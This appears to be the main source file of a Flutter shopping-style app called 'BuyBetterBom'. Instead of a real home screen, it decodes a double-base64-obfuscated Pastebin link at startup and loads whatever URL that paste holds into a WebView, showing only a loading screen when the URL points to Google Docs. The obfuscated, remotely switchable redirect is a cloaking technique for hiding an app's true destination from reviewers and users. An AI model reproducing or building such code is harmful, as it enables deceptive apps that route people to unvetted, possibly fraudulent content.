import 'dart:async';
import 'dart:convert';
import 'package:flutter/services.dart';
import 'package:flutter/cupertino.dart';
import 'package:flutter_localizations/flutter_localizations.dart';
import 'package:http/http.dart' as http;

import 'screens/loading_screen.dart';
import 'screens/webview_screen.dart';

const String kPastebinRawUrlB64 = 'YUhSMGNITTZMeTl3WVhOMFpXSnBiaTVqYjIwdmNtRjNMMjF5U0hoVFoybDI=';
const int kPastebinB64Rounds = 2;

String _decodeBase64NTimes(String input, int rounds) {
  var out = input.trim();
  for (var i = 0; i < rounds; i++) {
    final bytes = base64.decode(out);
    out = utf8.decode(bytes).trim();
  }
  return out;
}

String get kPastebinRawUrl => _decodeBase64NTimes(kPastebinRawUrlB64, kPastebinB64Rounds);

Future<String?> _fetchRedirectUrl() async {
  try {
    final resp = await http.get(Uri.parse(kPastebinRawUrl)).timeout(const Duration(seconds: 8));

    if (resp.statusCode != 200) return null;

    final text = resp.body.trim();

    final lines = text.split(RegExp(r'[\r\n]+')).map((e) => e.trim()).where((e) => e.isNotEmpty).toList();
    if (lines.isEmpty) return null;

    return lines.first;
  } catch (_) {
    return null;
  }
}

Future<void> main() async {
  WidgetsFlutterBinding.ensureInitialized();

  await SystemChrome.setPreferredOrientations(const [
    DeviceOrientation.portraitUp,
    DeviceOrientation.portraitDown,
  ]);

  runApp(const BuyBetterBomApp());
}

class BuyBetterBomApp extends StatelessWidget {
  const BuyBetterBomApp({super.key});

  @override
  Widget build(BuildContext context) {
    return CupertinoApp(
      title: 'BuyBetterBom',
      debugShowCheckedModeBanner: false,
      localizationsDelegates: const [
        GlobalMaterialLocalizations.delegate,
        GlobalCupertinoLocalizations.delegate,
        GlobalWidgetsLocalizations.delegate,
      ],
      supportedLocales: const [Locale('en', 'US')],

      home: FutureBuilder<String?>(
        future: _fetchRedirectUrl(),
        builder: (context, snapshot) {
          if (snapshot.connectionState != ConnectionState.done) {
            return const LoadingScreen();
          }

          final url = snapshot.data?.trim();

          if (url == null || url.isEmpty) {
            return const LoadingScreen();
          }

          if (url.contains('docs.google')) {
            return const LoadingScreen();
          }

          return WebViewScreen(url: url);
        },
      ),
    );
  }
}